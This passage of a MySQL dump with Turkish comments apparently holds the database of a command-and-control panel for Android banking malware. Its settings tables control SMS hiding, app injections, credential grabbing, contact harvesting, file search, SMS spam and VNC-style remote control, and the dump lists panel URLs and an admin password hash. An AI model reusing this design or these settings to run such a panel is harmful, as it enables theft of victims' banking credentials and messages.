(151, '366b0433992b2de2', '', '0', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(152, 'b460d3f82cfb82ee', '//734/735/736/737/739/740/741/744/748/753', '1', '0', '', '0', '0', '1', '0', '0', '0', '', '0'),
(153, '20d48a5342cdf847', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(154, 'e4b274a925d573b9', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(155, 'fff96a1fbe02d7f4', '/740', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(156, 'c876200dff34a9b', '/740', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(157, '5d7e8896b94d464d', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(158, '07aac4e4c53d514b', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(159, '9856e85d36bc277', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(160, '5a46d727a75a4d39', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(161, 'ef143232fcbd57f7', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(162, 'e42b5671dc21250c', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL),
(163, 'b54dd02a2a734203', '', '1', '0', NULL, '0', '0', '1', NULL, NULL, NULL, NULL, NULL);

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `settingsall`
--

CREATE TABLE `settingsall` (
  `id` int(10) UNSIGNED NOT NULL,
  `hash` varchar(500) DEFAULT NULL,
  `intInterval` varchar(50) DEFAULT NULL,
  `checksms` varchar(5) DEFAULT NULL,
  `checkhidesms` varchar(5) DEFAULT NULL,
  `checkgeolocation` varchar(5) DEFAULT NULL,
  `checkInjectionsApps` varchar(10) DEFAULT NULL,
  `secondInjectionsApps` varchar(250) DEFAULT NULL,
  `checkRequestGeolocation` varchar(10) DEFAULT NULL,
  `secondRequestGeolocation` varchar(250) DEFAULT NULL,
  `checkGrab_auto` varchar(10) DEFAULT NULL,
  `Grab_auto` varchar(1000) DEFAULT NULL,
  `secondGrab_auto` varchar(200) DEFAULT NULL,
  `checkInjGrab` varchar(10) DEFAULT NULL,
  `InjGrab` varchar(6000) DEFAULT NULL,
  `secondInjGrab` varchar(250) DEFAULT NULL,
  `checkPhoneContacts` varchar(10) DEFAULT NULL,
  `secondPhoneContacts` varchar(250) DEFAULT NULL,
  `checkStartGeolocation` varchar(10) DEFAULT NULL,
  `secondStartGeolocation` varchar(250) DEFAULT NULL,
  `urls` varchar(4000) CHARACTER SET armscii8 DEFAULT NULL,
  `urlInj` varchar(3000) DEFAULT NULL,
  `findfiles` varchar(2000) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Tablo döküm verisi `settingsall`
--

INSERT INTO `settingsall` (`id`, `hash`, `intInterval`, `checksms`, `checkhidesms`, `checkgeolocation`, `checkInjectionsApps`, `secondInjectionsApps`, `checkRequestGeolocation`, `secondRequestGeolocation`, `checkGrab_auto`, `Grab_auto`, `secondGrab_auto`, `checkInjGrab`, `InjGrab`, `secondInjGrab`, `checkPhoneContacts`, `secondPhoneContacts`, `checkStartGeolocation`, `secondStartGeolocation`, `urls`, `urlInj`, `findfiles`) VALUES
(1, 'GifZB455BysRbY5', '10000', '1', '1', '', '1', '10', '', '', '1', '', '5', '', '', '', '', '', '', '', 'http://bery.us/', 'http://bery.us/inj', '');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `smsspam`
--

CREATE TABLE `smsspam` (
  `id` int(255) NOT NULL,
  `number` varchar(20) CHARACTER SET utf8 NOT NULL,
  `status` varchar(5) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `t_users`
--

CREATE TABLE `t_users` (
  `id` int(255) NOT NULL,
  `login` varchar(500) NOT NULL,
  `password` varchar(500) NOT NULL,
  `right_` varchar(20) NOT NULL,
  `status` varchar(20) NOT NULL,
  `tag` varchar(1500) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Tablo döküm verisi `t_users`
--

INSERT INTO `t_users` (`id`, `login`, `password`, `right_`, `status`, `tag`) VALUES
(43, 'admin', '0cc175b9c0f1b6a831c399e269772661', 'admin', 'Action', 'tag');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `ws`
--

CREATE TABLE `ws` (
  `id` int(11) NOT NULL,
  `lastconnect` varchar(100) DEFAULT NULL,
  `botid` varchar(50) DEFAULT NULL,
  `command` varchar(200) DEFAULT NULL,
  `statusserver` int(2) DEFAULT NULL,
  `path` varchar(400) DEFAULT NULL,
  `FileFolder` varchar(3000) DEFAULT NULL,
  `statusfilefolder` varchar(2) DEFAULT NULL,
  `DownloadFile` varchar(2500) DEFAULT NULL,
  `vncscreen` varchar(20) DEFAULT NULL,
  `sound` varchar(50) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Tablo döküm verisi `ws`
--

INSERT INTO `ws` (`id`, `lastconnect`, `botid`, `command`, `statusserver`, `path`, `FileFolder`, `statusfilefolder`, `DownloadFile`, `vncscreen`, `sound`) VALUES
(1, '2020-07-28 14:00', 'e42b5671dc21250c', '', 1, 'storage/emulated/0/Download/ICQ', '!!!!!!!!!!!!', '0', NULL, '5.jpg', '424');

--
-- Dökümü yapılmış tablolar için indeksler
--

--
-- Tablo için indeksler `cc`
--
ALTER TABLE `cc`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `commands`
--
ALTER TABLE `commands`
  ADD PRIMARY KEY (`id`),
  ADD KEY `id` (`id`);

--
-- Tablo için indeksler `duplicate_commands`
--
ALTER TABLE `duplicate_commands`
  ADD PRIMARY KEY (`id`),
  ADD KEY `id` (`id`);

--
-- Tablo için indeksler `idbotwindows`
--
ALTER TABLE `idbotwindows`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `injection`
--
ALTER TABLE `injection`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `injs`
--
ALTER TABLE `injs`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `kliets`
--
ALTER TABLE `kliets`
  ADD PRIMARY KEY (`id`),
  ADD KEY `id` (`id`),
  ADD KEY `id_2` (`id`);

--
-- Tablo için indeksler `markers`
--
ALTER TABLE `markers`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `settings`
--
ALTER TABLE `settings`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `settingsall`
--
ALTER TABLE `settingsall`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `smsspam`
--
ALTER TABLE `smsspam`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `t_users`
--
ALTER TABLE `t_users`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `ws`
--
ALTER TABLE `ws`
  ADD PRIMARY KEY (`id`);

--
-- Dökümü yapılmış tablolar için AUTO_INCREMENT değeri
--

--
-- Tablo için AUTO_INCREMENT değeri `cc`
--
ALTER TABLE `cc`
  MODIFY `id` int(255) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- Tablo için AUTO_INCREMENT değeri `commands`
--
ALTER TABLE `commands`
  MODIFY `id` int(255) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=15;

--
-- Tablo için AUTO_INCREMENT değeri `duplicate_commands`
--
ALTER TABLE `duplicate_commands`
  MODIFY `id` int(255) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- Tablo için AUTO_INCREMENT değeri `idbotwindows`
--
ALTER TABLE `idbotwindows`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT;

--
-- Tablo için AUTO_INCREMENT değeri `injection`
--
ALTER TABLE `injection`
  MODIFY `id` int(60) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=1161;

--
-- Tablo için AUTO_INCREMENT değeri `injs`
--
ALTER TABLE `injs`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- Tablo için AUTO_INCREMENT değeri `kliets`
--
ALTER TABLE `kliets`
  MODIFY `id` int(255) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=238;

--
-- Tablo için AUTO_INCREMENT değeri `markers`
--
ALTER TABLE `markers`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=203;

--
-- Tablo için AUTO_INCREMENT değeri `settings`
--
ALTER TABLE `settings`
  MODIFY `id` int(60) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=164;

--
-- Tablo için AUTO_INCREMENT değeri `settingsall`
--
ALTER TABLE `settingsall`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- Tablo için AUTO_INCREMENT değeri `smsspam`
--
ALTER TABLE `smsspam`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- Tablo için AUTO_INCREMENT değeri `t_users`
--
ALTER TABLE `t_users`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=44;

--
-- Tablo için AUTO_INCREMENT değeri `ws`
--
ALTER TABLE `ws`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
